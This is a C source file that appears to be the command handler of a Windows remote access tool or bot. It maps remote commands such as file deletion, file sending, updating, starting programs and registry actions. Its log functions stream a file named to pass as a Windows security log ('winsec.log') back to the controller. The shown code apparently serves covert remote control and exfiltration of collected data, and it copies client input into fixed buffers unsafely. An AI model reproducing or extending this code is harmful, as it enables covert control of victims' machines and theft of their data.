#include "nn_actions.h"

#include <dirent.h>

void init_actions() //ACTIONS -> 13
{
    strcpy(actions[0].name, "ping");
    actions[0].func = action_ping;

    strcpy(actions[1].name, "ls");
    actions[1].func = action_ls;

    strcpy(actions[2].name, "up");
    actions[2].func = action_update;

    strcpy(actions[3].name, "start");
    actions[3].func = action_start;

    strcpy(actions[4].name, "delf");
    actions[4].func = action_delf;

    strcpy(actions[5].name, "sendf");
    actions[5].func = action_sendf;

    strcpy(actions[6].name, "log");
    actions[6].func = action_log;

    strcpy(actions[7].name, "errlog");
    actions[7].func = action_errlog;

    strcpy(actions[8].name, "dir");
    actions[8].func = action_dir;

    strcpy(actions[9].name, "stat");
    actions[9].func = action_stat;

    strcpy(actions[10].name, "rege");
    actions[10].func = action_rege;

    strcpy(actions[11].name, "regs");
    actions[11].func = action_regs;

    strcpy(actions[12].name, "regv");
    actions[12].func = action_regv;
}

int do_action(const char *id, char *args[], client_t *cl) //Return -1 if no actions found
{
    int i;
    for(i = 0; i<ACTIONS; i++)
    {
        if(strcmp(id, actions[i].name) == 0)
        {
            printf("\t\taction_%s started.\n", actions[i].name);
            int r = actions[i].func(args, cl);
            printf("\t\taction_%s over, return code=%d.\n", actions[i].name, r);
            return r;
        }
    }return

     -1;
}

/**** Actions utils ****/
void a_printf(const char *action_name, const char *s)
{
    printf("\t\t\t[%s] %s\n", action_name, s);
}

void send_failed(SOCKET s, const char *action_name, const char *reason)
{
    char buffer[512];
    sprintf(buffer, "failed/action=\"%s\"/reason=\"%s\"//", action_name, reason);

    if(safe_send(s, buffer, strlen(buffer), 0) == -1)
    {
        return;
    }
}
/***********************/

/*************** Actions ****************/
int action_ping(char *args[], client_t *cl)
{
    char buffer[10];
    strcpy(buffer, "pong//");
    safe_send(cl->s, buffer, strlen(buffer), 0);

    return 0;
}

int action_dir(char *args[], client_t *cl)
{
    char buffer[512];
    DIR *dir;

    if(args[0] == NULL)
    {
        a_printf("action_dir", "need at least one arg.");
        send_failed(cl->s, "action_dir", "need at least one arg.");
        return 1;
    }

    sprintf(buffer, "test if \"%s\" exists.", args[0]);
    a_printf("action_dir", buffer);

    dir = opendir(args[0]);
    if(dir == NULL)
    {
        sprintf(buffer, "result/action=\"action_dir\"/0//");
        safe_send(cl->s, buffer, strlen(buffer), 0);
    } else
    {
        sprintf(buffer, "result/action=\"action_dir\"/1//");
        safe_send(cl->s, buffer, strlen(buffer), 0);
    }

    return 0;
}

/******* LOGS *******/
#define PART_SZ 65536

int action_log(char *args[], client_t *cl)
{
    char buffer[PART_SZ];
    char buffer2[1024];
    FILE *file;

    close_log();
    file = fopen("log/winsec.log", "r");
    if(file == NULL)
    {
        sprintf(buffer2, "Error : %s", strerror(errno));
        a_printf("action_sendf", buffer2);

        send_failed(cl->s, "action_log", buffer2);
        return 2;
    }

    fseek(file, 0, SEEK_END);
    long int size = ftell(file);
    fseek(file, 0, SEEK_SET);

    sprintf(buffer2, "size : %ld", size);
    a_printf("action_log", buffer2);

    int nb_parts = (int) (size / PART_SZ);
    if((size % PART_SZ) > 0)
        nb_parts++;

    sprintf(buffer2, "nb_parts=%d", nb_parts);
    a_printf("action_log", buffer2);

    sprintf(buffer2, "result/action=\"action_log\"/%d//", nb_parts);
    safe_send(cl->s, buffer2, strlen(buffer2), 0);

    Sleep(100);

    int send_sz;
    int i;
    for(i = 0; i<nb_parts; i++)
    {
        Sleep(10);
        send_sz = PART_SZ;
        int j;
        for(j = 0; j<PART_SZ; j++)
        {
            int c = fgetc(file);
            if(c == EOF)
            {
                //sprintf(buffer2, "EOF - i=%d - c=%c (%d) - ftell()=%ld", j, c, c, ftell(file));
                //a_printf("action_log", buffer2);
                send_sz = j;
                break;
            }

            buffer[j] = (char) c;
        }
        //sprintf(buffer2, "sending part %d - size : %d", i, send_sz);
        //a_printf("action_log", buffer2);
        safe_send(cl->s, buffer, send_sz, 0);
    }
    fclose(file);
    start_log();

    a_printf("action_log", "all part sent.");

    return 0;
}

int action_errlog(char *args[], client_t *cl)
{
    a_printf("action_errlog", "test");

    char buffer[PART_SZ];
    char buffer2[1024];
    a_printf("action_errlog", "test2");
    FILE *file;

    close_log();

    a_printf("action_errlog", "test3");

    file = fopen("log/error.log", "r");
    if(file == NULL)
    {
        sprintf(buffer2, "Error : %s", strerror(errno));
        a_printf("action_sendf", buffer2);

        send_failed(cl->s, "action_errlog", buffer2);
        return 2;
    }

    fseek(file, 0, SEEK_END);
    long int size = ftell(file);
    fseek(file, 0, SEEK_SET);

    sprintf(buffer2, "size : %ld", size);
    a_printf("action_errlog", buffer2);

    int nb_parts = (int) (size / PART_SZ);
    if((size % PART_SZ) > 0)
        nb_parts++;

    sprintf(buffer2, "nb_parts=%d", nb_parts);
    a_printf("action_errlog", buffer2);

    sprintf(buffer2, "result/action=\"action_errlog\"/%d//", nb_parts);
    safe_send(cl->s, buffer2, strlen(buffer2), 0);

    Sleep(100);

    int send_sz;
    int i;
    for(i = 0; i<nb_parts; i++)
    {
        Sleep(10);
        send_sz = PART_SZ;
        int j;
        for(j = 0; j<PART_SZ; j++)
        {
            int c = fgetc(file);
            if(c == EOF)
            {
                //sprintf(buffer2, "EOF - i=%d - c=%c (%d) - ftell()=%ld", j, c, c, ftell(file));
                //a_printf("action_errlog", buffer2);
                send_sz = j;
                break;
            }

            buffer[j] = (char) c;
        }
        //sprintf(buffer2, "sending part %d - size : %d", i, send_sz);
        //a_printf("action_errlog", buffer2);
        safe_send(cl->s, buffer, send_sz, 0);
    }
    fclose(file);
    start_log();

    a_printf("action_errlog", "all part sent.");

    return 0;
}
/*****************/
